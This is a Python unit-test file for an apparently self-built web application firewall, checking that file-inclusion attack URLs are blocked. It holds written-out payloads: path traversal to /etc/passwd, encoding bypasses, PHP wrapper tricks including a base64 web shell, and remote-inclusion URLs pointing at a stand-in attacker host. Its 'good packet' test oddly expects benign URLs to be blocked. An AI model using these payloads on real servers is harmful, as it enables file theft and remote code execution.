import unittest
from web_application_firewall.project import filtering

#do some tests

class TestFileInclusion(unittest.TestCase):

    def test_sanity(self):
        self.assertEqual(True, True)

    def test_good_packet(self):
        normal_1 = "http://www.google.com/page/"
        normal_2 = "https://www.google.com/search?q=file+inclusion&client=firefox-b-d&ei=kog6Y4HgF7n14-EP-sGqwAU&ved=0ahUKEwiB8a6zvsP6AhW5-jgGHfqgClgQ4dUDCA0&uact=5&oq=file+inclusion&gs_lcp=Cgdnd3Mtd2l6EAMyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEOgoIABBHENYEELADOgQIABBDOgsIABCABBCxAxCDAToLCC4QgAQQsQMQgwE6CAguELEDEIMBOhEILhCABBCxAxCDARDHARDRAzoLCC4QsQMQgwEQ1AI6BQgAEJECOggIABCABBCxAzoRCC4QgAQQsQMQgwEQxwEQrwE6FAguEIAEELEDEIMBEMcBEK8BENQCOggIABCxAxCRAjoICAAQsQMQgwE6BwgAEIAEEApKBAhBGABKBAhGGABQ_g1YsSBg7SJoA3ABeAGAAZMEiAHmHJIBCjItMTAuMi4wLjGYAQCgAQHIAQjAAQE&sclient=gws-wiz"

        packets = [normal_1, normal_2]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403", i)

    def test_path_traversal(self):
        path_traversal_1 = "http://vulnerable-site.com/index.php?page=../../../etc/passwd"
        path_traversal_2 = "http://vulnerable-site.com/index.php?page=....//....//....//etc/passwd"
        path_traversal_3 = "http://vulnerable-site.com/index.php?page=....\\/....\\/....\\/etc/passwd"
        path_traversal_4 = "http://vulnerable-site.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"

        packets = [path_traversal_1, path_traversal_2, path_traversal_3, path_traversal_4]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403", i)

    def test_php_wrapper(self):
        filter_1 = "http://vulnerable-site.com/index.php?page=php://filter/read=string.rot13/resource=index.php"
        filter_2 = "http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=index.php"
        filter_3 = "http://vulnerable-site.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php"

        zlib = "http://vulnerable-site.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
        zip_wrapper = "http://vulnerable-site.com/index.php?page=zip://shell.jpg%23payload.php"

        data_1 = "http://vulnerable-site.com/?page=data://text/plain,<?php echo base64_encode(file_get_contents(“index.php”)); ?>\""
        data_2 = "http://vulnerable-site.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="

        packets = [filter_1, filter_2, filter_3, zlib, zip_wrapper, data_1, data_2]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403", i)

    def test_encoding(self):
        encoding_1 = "http://vulnerable-site.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd"
        encoding_2 = "http://vulnerable-site.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        encoding_3 = "http://vulnerable-site.com/index.php?page=%252e%252e%252fetc%252fpasswd"
        encoding_4 = "http://vulnerable-site.com/index.php?page=%252e%252e%252fetc%252fpasswd%00"

        packets = [encoding_1, encoding_2, encoding_3, encoding_4]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403", i)

    def test_null_byte_injection(self):
        null_byte_injection = "http://vulnerable-site.com/index.php?page=../../../etc/passwd%00"

        packets = [null_byte_injection]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403", i)

    def test_access_folder(self):
        existing_folder = "http://vulnerable-site.com/index.php?page=utils/scripts/../../../../../etc/passwd"

        packets = [existing_folder]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403", i)

    def test_path_truncation(self):
        path_truncation_1 = "http://vulnerable-site.com/index.php?page=a/../../../../../../../../../etc/passwd..\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\[ADD MORE]\\.\\."
        path_truncation_2 = "http://vulnerable-site.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././."
        path_truncation_3 = "http://vulnerable-site.com/index.php?page=a/./.[ADD MORE]/etc/passwd"
        path_truncation_4 = "http://vulnerable-site.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd"

        packets = [path_truncation_1, path_truncation_2, path_truncation_3, path_truncation_4]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403", i)

    def test_rfi(self):
        rfi_1 = "http://vulnerable-site.com/index.php?page=http://atacker.com/evil.php"
        rfi_2 = "http://vulnerable-site.com/index.php?page=\\\\attacker.com\\evil.php"

        packets = [rfi_1, rfi_2]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403", i)

    def test_filter_bypass(self):
        filter_bypass_1 = "http://vulnerable-site.com/index.php?page=....//....//etc/passwd"
        filter_bypass_2 = "http://vulnerable-site.com/index.php?page=..///////..////..//////etc/passwd"
        filter_bypass_3 = "http://vulnerable-site.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
        filter_bypass_4 = "http://vulnerable-site.com/index.php?page=/var/www/../../etc/passwd"
        filter_bypass_5 = "http://vulnerable-site.com/index.php?page=../../../etc/passwd"
        filter_bypass_6 = "http://vulnerable-site.com/index.php?page=....//....//....//etc/passwd"
        filter_bypass_7 = "http://vulnerable-site.com/index.php?page=....\\/....\\/....\\/etc/passwd"
        filter_bypass_8 = "http://vulnerable-site.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"

        packets = [filter_bypass_1, filter_bypass_2, filter_bypass_3, filter_bypass_4, filter_bypass_5, filter_bypass_6, filter_bypass_7, filter_bypass_8]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403", i)


if __name__ == '__main__':
    unittest.main()
